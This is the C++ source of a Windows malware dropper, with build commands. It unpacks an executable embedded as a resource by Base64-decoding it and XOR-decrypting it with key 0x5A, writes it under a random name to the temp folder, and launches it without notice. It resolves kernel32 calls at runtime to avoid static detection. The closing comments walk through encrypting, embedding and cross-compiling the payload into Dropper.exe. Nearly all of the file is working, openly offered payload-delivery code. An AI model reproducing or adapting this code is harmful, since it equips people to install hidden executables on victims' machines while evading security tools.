#define UNICODE
#include <windows.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>


#define IDR_EXE1 101

#define XOR_KEY  0x5A

#include <windows.h>
#include <wincrypt.h>

// Decodes a Base64 text buffer (not null-terminated necessarily).
// `pBase64` points to base64 bytes, length is 'cbBase64'.
// On success returns pointer to newly malloc'd buffer and sets *pcbOut.
// Caller must free() returned buffer.
BYTE* DecodeBase64Resource(const BYTE* pBase64, DWORD cbBase64, DWORD* pcbOut) {
    if (!pBase64 || cbBase64 == 0 || !pcbOut) return NULL;
    // CryptStringToBinaryA expects a null-terminated C string or length. We can pass length.
    DWORD outLen = 0;
    BOOL ok = CryptStringToBinaryA((LPCSTR)pBase64, (DWORD)cbBase64,
                                   CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL);
    if (!ok || outLen == 0) return NULL;

    BYTE* out = (BYTE*)malloc(outLen);
    if (!out) return NULL;

    ok = CryptStringToBinaryA((LPCSTR)pBase64, (DWORD)cbBase64,
                              CRYPT_STRING_BASE64, out, &outLen, NULL, NULL);
    if (!ok) { free(out); return NULL; }

    *pcbOut = outLen;
    return out;
}
bool GetDecodedResourceBuffer(HMODULE hModule, int resId, BYTE** ppOut, DWORD* pOutSize) {
    if (!ppOut || !pOutSize) return false;
    *ppOut = NULL;
    *pOutSize = 0;

    HRSRC hRes = FindResourceW(hModule, MAKEINTRESOURCE(resId), RT_RCDATA);
    if (!hRes) return false;

    HGLOBAL hGlob = LoadResource(hModule, hRes);
    if (!hGlob) return false;

    DWORD resSize = SizeofResource(hModule, hRes);
    if (resSize == 0) return false;

    const BYTE* pResData = (const BYTE*)LockResource(hGlob);
    if (!pResData) return false;

    DWORD decodedSize = 0;
    BYTE* decoded = DecodeBase64Resource(pResData, resSize, &decodedSize);
    if (!decoded || decodedSize == 0) {
        if (decoded) free(decoded);
        return false;
    }

    *ppOut = decoded;       // caller takes ownership
    *pOutSize = decodedSize;
    return true;
}


// -----------------------------------------------------------
// XOR decrypt
void xor_decrypt(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

// -----------------------------------------------------------
// Dynamic Unicode API resolver
FARPROC ResolveAPIW(LPCWSTR dllName, LPCSTR funcName) {
    HMODULE hMod = LoadLibraryW(dllName);
    if (!hMod) return NULL;
    return GetProcAddress(hMod, funcName);
}

// -----------------------------------------------------------
// Extract, decrypt, and run embedded EXE
void DropAndRun(HMODULE hModule) {
    WCHAR tempPath[MAX_PATH] = {0};
    WCHAR fullPath[MAX_PATH] = {0};

    // GetTempPathW
    typedef DWORD (WINAPI* GetTempPathW_t)(DWORD, LPWSTR);
    GetTempPathW_t pGetTempPathW = (GetTempPathW_t)ResolveAPIW(L"kernel32.dll", "GetTempPathW");
    if (!pGetTempPathW) return;
    pGetTempPathW(MAX_PATH, tempPath);

    // create random filename
    srand((unsigned int)time(NULL));
    WCHAR fileName[20];
    swprintf(fileName, 20, L"D%04d.exe", rand() % 10000);
    wcscpy(fullPath, tempPath);
    wcscat(fullPath, fileName);

    // --- Decode resource into memory (no file I/O yet) ---
    BYTE* decodedPayload = NULL;
    DWORD decodedSize = 0;
    if (!GetDecodedResourceBuffer(hModule, IDR_EXE1, &decodedPayload, &decodedSize)) {
        // fail quietly (or MessageBoxW to debug)
        return;
    }


    BYTE* decrypted = (BYTE*)malloc(decodedSize);
    if (!decrypted) {
        free(decodedPayload);
        return;
    }
    memcpy(decrypted, decodedPayload, decodedSize);
    xor_decrypt(decrypted, decodedSize, XOR_KEY);

    free(decodedPayload);

    // Write to disk
    FILE* f = _wfopen(fullPath, L"wb");
    if (f) {
        fwrite(decrypted, 1, decodedSize, f);
        fclose(f);
    }
    free(decrypted);

    // Run executable
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    typedef BOOL (WINAPI* CreateProcessW_t)(
        LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

    CreateProcessW_t pCreateProcessW = (CreateProcessW_t)ResolveAPIW(L"kernel32.dll", "CreateProcessW");
    if (pCreateProcessW) {
        pCreateProcessW(fullPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// -----------------------------------------------------------
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR lpCmdLine, int nCmdShow) {
    HMODULE hModule = GetModuleHandleA(NULL);
    DropAndRun(hModule);
    return 0;

}
//python xor_encrypt.py 1 33.bin    
//base64 33.bin > 333.bin
//x86_64-w64-mingw32-windres res.rc -O coff -o res.o 
//x86_64-w64-mingw32-g++ dropper.cpp res.o -static -static-libgcc -static-libstdc++ -lgdiplus -luser32 -lgdi32 -lole32 -luuid -lcrypt32 -mwindows -municode -o Dropper.exe